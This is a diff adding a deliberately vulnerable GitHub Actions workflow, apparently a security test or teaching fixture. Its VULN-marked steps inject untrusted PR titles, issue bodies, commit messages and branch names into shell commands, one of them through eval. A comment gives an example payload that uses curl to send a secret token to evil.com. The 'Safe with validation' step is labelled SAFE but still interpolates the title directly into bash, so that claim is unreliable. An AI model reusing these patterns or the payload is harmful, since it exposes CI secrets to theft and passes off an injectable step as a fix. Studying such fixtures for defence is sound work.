@@ -1,0 +1,61 @@
+# VULN: Command injection via untrusted PR data in shell scripts
+# Attack: Submit PR with title like "; curl http://evil.com/steal?token=$SECRET"
+name: Script Injection
+
+on:
+  pull_request_target:
+  issues:
+    types: [opened, edited]
+
+jobs:
+  vulnerable-script:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Welcome comment
+        run: |
+          # VULN: PR title injected directly into bash
+          echo "Thanks for: ${{ github.event.pull_request.title }}"
+
+      - name: Issue labeling
+        run: |
+          # VULN: Issue body injected into script
+          BODY="${{ github.event.issue.body }}"
+          echo "Processing: $BODY"
+
+      - name: Commit message logging
+        run: |
+          # VULN: Commit message from PR can contain malicious commands
+          git log -1 --pretty=format:"${{ github.event.head_commit.message }}"
+
+      - name: Branch name usage
+        env:
+          # VULN: Branch name from PR can be malicious
+          BRANCH_NAME: ${{ github.head_ref }}
+        run: |
+          echo "Building branch: $BRANCH_NAME"
+          eval "npm run build:$BRANCH_NAME"  # VULN: eval with untrusted data
+
+      - name: PR number in filename
+        run: |
+          # VULN: PR number used in filename without validation
+          FILENAME="report-${{ github.event.pull_request.number }}.txt"
+          touch "$FILENAME"
+
+  # SAFE COMPARISON: Properly escaped/validated
+  safe-script:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Safe welcome
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          # SAFE: Data in environment variable, not direct interpolation
+          echo "Thanks for PR: $PR_TITLE"
+
+      - name: Safe with validation
+        run: |
+          # SAFE: Validate before use
+          TITLE="${{ github.event.pull_request.title }}"
+          if [[ "$TITLE" =~ ^[a-zA-Z0-9\ \-]+$ ]]; then
+            echo "Valid title: $TITLE"
+          fi
